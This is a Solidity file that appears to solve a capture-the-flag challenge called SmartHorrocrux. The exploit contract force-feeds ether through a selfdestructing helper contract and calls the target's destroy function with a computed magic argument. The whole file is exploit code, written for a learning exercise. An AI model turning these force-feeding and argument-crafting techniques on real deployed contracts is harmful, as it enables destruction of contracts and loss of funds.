// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity 0.8.17;

import { SmartHorrocrux } from "eko/ChallengeSmartHorrocrux.sol";

contract SmartHorrocruxCracker {
  constructor(SmartHorrocrux horrocrux) payable {
    require(msg.value == 1);
    (bool success, ) = address(horrocrux).call("");
    require(success);
    new ForceFeeder{ value: 1 }(payable(address(horrocrux)));
    horrocrux.setInvincible();
    horrocrux.destroyIt(
      "EtherKadabra",
      0x45746865724b6164616272610000000000000000000000000000000000000000 - uint256(bytes32(horrocrux.kill.selector))
    );
  }
}

contract ForceFeeder {
  constructor(address payable recipient) payable {
    selfdestruct(recipient);
  }
}
